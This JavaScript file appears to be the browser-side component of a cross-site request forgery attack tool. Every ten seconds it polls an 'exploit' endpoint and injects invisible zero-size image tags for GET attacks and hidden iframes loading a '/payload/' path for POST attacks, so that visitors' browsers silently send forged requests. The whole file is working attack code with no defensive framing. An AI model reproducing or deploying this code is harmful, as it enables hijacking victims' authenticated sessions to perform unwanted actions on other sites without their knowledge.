function insert_attacks_in_dom(data) {
	for (index in data) {
		// alert(data[attack].method);
		var attack = data[index];
		if (attack.method == "GET") {
			// GET method (use img)
			$('#attack').append('<img src="' + attack.url + '" height=0 width=0>');
		} else {
			// POST method (use iframe)
			$('#attack').append('<iframe src="' + /payload/ + attack.num_scenario + '/' + attack.num_attack +  '/' + attack.val + '" height=0 width=0>');
		}
	}
}

$(document).ready(function() {

    setInterval(function() {

		$.getJSON('exploit', function(data) {
			// if result
			if (data.length > 0) {

				// insert a div in body
				$('body').append('<div id="attack"></div>');
				insert_attacks_in_dom(data);
			}
		});

		// remove the div for the attack.
		$('#attack').remove();

    }, 10000);


});